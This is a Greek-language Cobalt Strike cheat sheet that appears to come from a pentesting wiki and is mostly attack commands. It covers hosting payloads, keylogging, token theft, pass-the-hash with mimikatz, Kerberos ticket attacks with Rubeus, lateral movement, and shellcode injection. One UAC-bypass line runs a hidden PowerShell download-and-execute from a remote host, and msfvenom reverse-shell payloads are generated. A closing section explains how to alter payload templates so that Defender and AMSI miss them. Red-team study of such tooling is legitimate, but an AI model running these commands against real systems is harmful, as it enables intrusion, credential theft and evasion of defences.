# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` τότε μπορείτε να επιλέξετε πού να ακούσετε, ποιο είδος beacon να χρησιμοποιήσετε (http, dns, smb...) και άλλα.

### Peer2Peer Listeners

Τα beacons αυτών των listeners δεν χρειάζεται να μιλούν απευθείας στο C2, μπορούν να επικοινωνούν μέσω άλλων beacons.

`Cobalt Strike -> Listeners -> Add/Edit` τότε πρέπει να επιλέξετε τα TCP ή SMB beacons

* Το **TCP beacon θα ρυθμίσει έναν listener στην επιλεγμένη θύρα**. Για να συνδεθείτε σε ένα TCP beacon χρησιμοποιήστε την εντολή `connect <ip> <port>` από άλλο beacon
* Το **smb beacon θα ακούει σε ένα pipename με το επιλεγμένο όνομα**. Για να συνδεθείτε σε ένα SMB beacon πρέπει να χρησιμοποιήσετε την εντολή `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`&#x20;

* **`HTMLApplication`** για αρχεία HTA
* **`MS Office Macro`** για ένα έγγραφο office με μακροεντολή
* **`Windows Executable`** για ένα .exe, .dll ή υπηρεσία .exe
* **`Windows Executable (S)`** για ένα **stageless** .exe, .dll ή υπηρεσία .exe (καλύτερα stageless από staged, λιγότερα IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Αυτό θα δημιουργήσει ένα script/executable για να κατεβάσει το beacon από το cobalt strike σε μορφές όπως: bitsadmin, exe, powershell και python

#### Host Payloads

Αν έχετε ήδη το αρχείο που θέλετε να φιλοξενήσετε σε έναν web server απλά πηγαίνετε στο `Attacks -> Web Drive-by -> Host File` και επιλέξτε το αρχείο για φιλοξενία και τη ρύθμιση του web server.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
execute-assembly &#x3C;/path/to/executable.exe>

# Screenshots
printscreen    # Πάρτε μια μόνο screenshot μέσω της μεθόδου PrintScr
screenshot     # Πάρτε μια μόνο screenshot
screenwatch    # Πάρτε περιοδικές screenshots της επιφάνειας εργασίας
## Πηγαίνετε στο View -> Screenshots για να τις δείτε

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes για να δείτε τα πλήκτρα που πατήθηκαν

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Εισάγετε την ενέργεια portscan μέσα σε άλλη διαδικασία
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;just write powershell cmd here>

# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Δημιουργήστε token για να προσποιηθείτε έναν χρήστη στο δίκτυο
ls \\computer_name\c$ # Δοκιμάστε να χρησιμοποιήσετε το παραγόμενο token για να αποκτήσετε πρόσβαση στο C$ σε έναν υπολογιστή
rev2self # Σταματήστε να χρησιμοποιείτε το token που δημιουργήθηκε με make_token
## Η χρήση του make_token δημιουργεί το γεγονός 4624: Ένας λογαριασμός συνδέθηκε επιτυχώς.  Αυτό το γεγονός είναι πολύ κοινό σε ένα Windows domain, αλλά μπορεί να περιοριστεί φιλτράροντας τον Τύπο Σύνδεσης.  Όπως αναφέρθηκε παραπάνω, χρησιμοποιεί το LOGON32_LOGON_NEW_CREDENTIALS που είναι τύπος 9.

# UAC Bypass
elevate svc-exe &#x3C;listener>
elevate uac-token-duplication &#x3C;listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Όπως το make_token αλλά κλέβοντας το token από μια διαδικασία
steal_token [pid] # Επίσης, αυτό είναι χρήσιμο για ενέργειες δικτύου, όχι τοπικές ενέργειες
## Από την τεκμηρίωση API γνωρίζουμε ότι αυτός ο τύπος σύνδεσης "επιτρέπει στον καλούντα να κλωνοποιήσει το τρέχον token του". Γι' αυτό η έξοδος Beacon λέει Προσωποποιημένο &#x3C;current_username> - προσποιείται το κλωνοποιημένο token μας.
ls \\computer_name\c$ # Δοκιμάστε να χρησιμοποιήσετε το παραγόμενο token για να αποκτήσετε πρόσβαση στο C$ σε έναν υπολογιστή
rev2self # Σταματήστε να χρησιμοποιείτε το token από steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Κάντε το από έναν κατάλογο με δικαιώματα ανάγνωσης όπως: cd C:\
## Όπως το make_token, αυτό θα δημιουργήσει το γεγονός Windows 4624: Ένας λογαριασμός συνδέθηκε επιτυχώς αλλά με τύπο σύνδεσης 2 (LOGON32_LOGON_INTERACTIVE).  Θα αναφέρει τον καλούντα χρήστη (TargetUserName) και τον προσωποποιημένο χρήστη (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## Από άποψη OpSec: Μην εκτελείτε διασυνοριακή ένεση εκτός αν είναι απολύτως απαραίτητο (π.χ. x86 -> x64 ή x64 -> x86).

## Pass the hash
## Αυτή η διαδικασία τροποποίησης απαιτεί patching της μνήμης LSASS που είναι μια ενέργεια υψηλού κινδύνου, απαιτεί τοπικά δικαιώματα διαχειριστή και δεν είναι πάντα βιώσιμη αν είναι ενεργοποιημένη η Protected Process Light (PPL).
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
## Χωρίς /run, το mimikatz δημιουργεί ένα cmd.exe, αν τρέχετε ως χρήστης με Desktop, θα δει το shell (αν τρέχετε ως SYSTEM είστε εντάξει)
steal_token &#x3C;pid> #Κλέψτε το token από τη διαδικασία που δημιουργήθηκε από το mimikatz

## Pass the ticket
## Ζητήστε ένα εισιτήριο
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
## Δημιουργήστε μια νέα συνεδρία σύνδεσης για να χρησιμοποιήσετε με το νέο εισιτήριο (για να μην αντικαταστήσετε το παραβιασμένο)
make_token &#x3C;domain>\&#x3C;username> DummyPass
## Γράψτε το εισιτήριο στη μηχανή του επιτιθέμενου από μια συνεδρία poweshell &#x26; φορτώστε το
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Δημιουργήστε μια νέα διαδικασία με το εισιτήριο
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Κλέψτε το token από αυτή τη διαδικασία
steal_token &#x3C;pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump interesting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### Δημιουργήστε νέα συνεδρία σύνδεσης, σημειώστε το luid και το processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Εισάγετε το εισιτήριο στη δημιουργηθείσα συνεδρία σύνδεσης
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Τέλος, κλέψτε το token από αυτή τη νέα διαδικασία
steal_token &#x3C;pid>

# Lateral Movement
## Αν έχει δημιουργηθεί ένα token θα χρησιμοποιηθεί
jump [method] [target] [listener]
## Μέθοδοι:
## psexec                    x86   Χρησιμοποιήστε μια υπηρεσία για να εκτελέσετε ένα Service EXE artifact
## psexec64                  x64   Χρησιμοποιήστε μια υπηρεσία για να εκτελέσετε ένα Service EXE artifact
## psexec_psh                x86   Χρησιμοποιήστε μια υπηρεσία για να εκτελέσετε μια PowerShell one-liner
## winrm                     x86   Εκτελέστε ένα PowerShell script μέσω WinRM
## winrm64                   x64   Εκτελέστε ένα PowerShell script μέσω WinRM

remote-exec [method] [target] [command]
## Μέθοδοι:
<strong>## psexec                          Απομακρυσμένη εκτέλεση μέσω του Service Control Manager
</strong>## winrm                           Απομακρυσμένη εκτέλεση μέσω WinRM (PowerShell)
## wmi                             Απομακρυσμένη εκτέλεση μέσω WMI

## Για να εκτελέσετε ένα beacon με wmi (δεν είναι στην εντολή jump) απλά ανεβάστε το beacon και εκτελέστε το
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## Στον host του metaploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Στο cobalt: Listeners > Add και ρυθμίστε το Payload σε Foreign HTTP. Ρυθμίστε το Host σε 10.10.5.120, την Θύρα σε 8080 και κάντε κλικ στο Save.
beacon> spawn metasploit
## Μπορείτε να δημιουργήσετε μόνο x86 Meterpreter sessions με τον ξένο listener.

# Pass session to Metasploit - Through shellcode injection
## Στον host του metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## Εκτελέστε το msfvenom και προετοιμάστε τον listener multi/handler

## Αντιγράψτε το bin αρχείο στον host του cobalt strike
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Εισάγετε το shellcode του metasploit σε μια διαδικασία x64

# Pass metasploit session to cobalt strike
## Δημιουργήστε stageless Beacon shellcode, πηγαίνετε στο Attacks > Packages > Windows Executable (S), επιλέξτε τον επιθυμητό listener, επιλέξτε Raw ως τον τύπο εξόδου και επιλέξτε Use x64 payload.
## Χρησιμοποιήστε post/windows/manage/shellcode_inject στο metasploit για να εισάγετε το παραγόμενο shellcode του cobalt strike


# Pivoting
## Ανοίξτε ένα socks proxy στον teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Avoiding AVs

### Artifact Kit

Συνήθως στο `/opt/cobaltstrike/artifact-kit` μπορείτε να βρείτε τον κώδικα και τα προ-συγκεντρωμένα πρότυπα (στο `/src-common`) των payloads που θα χρησιμοποιήσει το cobalt strike για να δημιουργήσει τα binary beacons.

Χρησιμοποιώντας [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) με την παραγόμενη backdoor (ή απλά με το συγκεντρωμένο πρότυπο) μπορείτε να βρείτε τι προκαλεί την ενεργοποίηση του defender. Συνήθως είναι μια συμβολοσειρά. Επομένως, μπορείτε απλά να τροποποιήσετε τον κώδικα που δημιουργεί την backdoor έτσι ώστε αυτή η συμβολοσειρά να μην εμφανίζεται στο τελικό binary.

Αφού τροποποιήσετε τον κώδικα, απλά εκτελέστε `./build.sh` από τον ίδιο κατάλογο και αντιγράψτε τον φάκελο `dist-pipe/` στη Windows client στο `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Μην ξεχάσετε να φορτώσετε το επιθετικό σενάριο `dist-pipe\artifact.cna` για να υποδείξετε στο Cobalt Strike να χρησιμοποιήσει τους πόρους από το δίσκο που θέλουμε και όχι αυτούς που έχουν φορτωθεί.

### Resource Kit

Ο φάκελος ResourceKit περιέχει τα πρότυπα για τα σενάρια payload του Cobalt Strike που βασίζονται σε σενάρια, συμπεριλαμβανομένων των PowerShell, VBA και HTA.

Χρησιμοποιώντας [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) με τα πρότυπα μπορείτε να βρείτε τι δεν αρέσει στον defender (AMSI σε αυτή την περίπτωση) και να το τροποποιήσετε:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Η τροποποίηση των ανιχνευμένων γραμμών μπορεί να δημιουργήσει ένα πρότυπο που δεν θα ανιχνευθεί.

Μην ξεχάσετε να φορτώσετε το επιθετικό σενάριο `ResourceKit\resources.cna` για να υποδείξετε στο Cobalt Strike να χρησιμοποιήσει τους πόρους από τον δίσκο που θέλουμε και όχι αυτούς που έχουν φορτωθεί.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

